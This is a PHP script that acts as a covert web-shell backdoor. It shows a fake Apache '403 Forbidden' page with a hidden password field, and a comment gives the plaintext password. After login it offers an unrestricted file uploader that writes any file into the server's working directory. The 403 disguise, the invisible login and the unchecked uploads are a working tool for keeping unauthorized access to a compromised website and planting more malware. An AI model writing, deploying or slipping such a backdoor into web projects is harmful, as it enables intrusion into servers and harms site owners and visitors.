<?php
// Predefined password hash for 'semarang1' (SHA-1 hash)
$validPasswordHash = "c0e69812c177edcb1bc72fe0ee7d020e67cd72b8"; 

// Start the session to manage user login
session_start();

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $password = $_POST['password'];

    // Hash the entered password using SHA-1 and compare with the stored hash
    if (sha1($password) === $validPasswordHash) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "Invalid password";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Redirect to login if not logged in
if (!isset($_SESSION['loggedin'])) {
    ?>
    
    


<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<?php if (isset($error)): ?>
        <p style="color: red;"><b><?php echo $error; ?></b></p>
    <?php endif; ?>
    <form method="post">
        <input style="margin:0;background-color:white;border:0px;" type="password" name="password" id="password" required><br><br>

        <button type="submit" style="display: none;" name="login">Login</button>
    </form>
</body></html>

    <?php
    exit();
}

// File uploader logic (same as your original code)
class FileUploader {
    private $destinationFolder;

    public function __construct($destinationFolder = null) {
        $this->destinationFolder = $destinationFolder !== null ? $destinationFolder : getcwd();
    }

    public function handleUpload($file, $key) {
        if ($key === 'upload') {
            if ($this->isValidFile($file)) {
                $destination = $this->getDestinationPath($file['name']);
                if ($this->moveUploadedFile($file['tmp_name'], $destination)) {
                    echo "<b>True: {$destination}</b>";
                } else {
                    echo "<b>False</b>";
                }
            } else {
                echo "Error: " . $file['error'];
            }
        }
    }

    private function isValidFile($file) {
        return isset($file) && isset($file['error']) && $file['error'] === UPLOAD_ERR_OK;
    }

    private function getDestinationPath($fileName) {
        $sanitizedFileName = basename($fileName);
        return rtrim($this->destinationFolder, '/') . '/' . $sanitizedFileName;
    }

    private function moveUploadedFile($tmpName, $destination) {
        if (function_exists('move_uploaded_file')) {
            return move_uploaded_file($tmpName, $destination);
        } else {
            return rename($tmpName, $destination);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k'])) {
    $uploader = new FileUploader();
    if (isset($_FILES['f'])) {
        $uploader->handleUpload($_FILES['f'], $_POST['k']);
    } else {
        echo "No file uploaded.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Uploader</title>
</head>
<body>
    <h1>File Uploader</h1>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="f">
        <input name="k" type="submit" value="upload">
    </form>
    <br>
    <a href="?logout=true">Logout</a>
</body>
</html>
